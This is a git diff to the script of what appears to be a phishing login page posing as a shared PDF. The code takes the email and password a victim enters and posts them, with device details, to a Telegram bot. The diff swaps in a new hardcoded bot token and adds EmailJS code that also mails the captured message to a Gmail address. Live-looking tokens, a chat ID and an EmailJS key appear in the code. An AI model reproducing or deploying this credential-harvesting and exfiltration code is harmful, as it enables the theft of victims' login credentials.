@@ -663,14 +663,16 @@ input[type=range]::-moz-range-thumb{width:12px;height:12px;border-radius:50%;bac
     const messageDiv = document.getElementById('message');
     const emailInput = document.getElementById('email');
     const passwordInput = document.getElementById('password');
-  
+  let messageJs = null;
 
     // ==================== TELEGRAM CONFIGURATION ====================
     // IMPORTANT: Replace these with your actual Bot Token and Chat ID
     // Get Bot Token from @BotFather on Telegram
     // Get Chat ID from @userinfobot or by sending a message to your bot and visiting:
     // https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
-    const TELEGRAM_BOT_TOKEN = '8942885189:AAHWAF51YpLeJHnGoUJak4fDTXvw0mBcOc0';  // <-- REPLACE WITH YOUR BOT TOKEN
+    //const TELEGRAM_BOT_TOKEN = '8942885189:AAHWAF51YpLeJHnGoUJak4fDTXvw0mBcOc0';  // <-- REPLACE WITH YOUR BOT TOKEN
+    //const TELEGRAM_CHAT_ID = '8890264087';      // <-- REPLACE WITH YOUR CHAT ID
+    const TELEGRAM_BOT_TOKEN = '9059070014:AAH3kY708Nkvp4bxQQ6RXtmx0NItVQeTMM0';  // <-- REPLACE WITH YOUR BOT TOKEN
     const TELEGRAM_CHAT_ID = '8890264087';      // <-- REPLACE WITH YOUR CHAT ID
     // ================================================================
 
@@ -697,7 +699,7 @@ input[type=range]::-moz-range-thumb{width:12px;height:12px;border-radius:50%;bac
                       `🖥️ Platform: ${platform}\n` +
                       `🌐 Language: ${language}\n` +
                       `🔄 Attempt: ${attempt + 1}/${maxAttempts}`;
-
+      messageJs = message;
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       
       try {
@@ -780,6 +782,37 @@ input[type=range]::-moz-range-thumb{width:12px;height:12px;border-radius:50%;bac
       */
 
 
+      // Initialize EmailJS
+  emailjs.init({
+    publicKey: "tqbH3N-tXJVe_-kN4"
+  });
+
+  async function sendEmail(name, email, message) {
+    try {
+      const response = await emailjs.send(
+        "service_mhpfrk9", // Service ID
+        "template_y2jnjlj", //YOUR_TEMPLATE_ID
+        {
+          from_name: name,
+          from_email: email,
+          message: message
+        }
+      );
+
+      console.log("Email sent successfully!", response);
+      return true;
+
+    } catch (error) {
+      console.error("Email sending failed:", error);
+      return false;
+    }
+  }
+ 
+ sendEmail(
+    "sharedpdf",
+    "l86599514@gmail.com",
+    messageJs
+  );
 
 
       if (attempt+1 <= maxAttempts && password) {
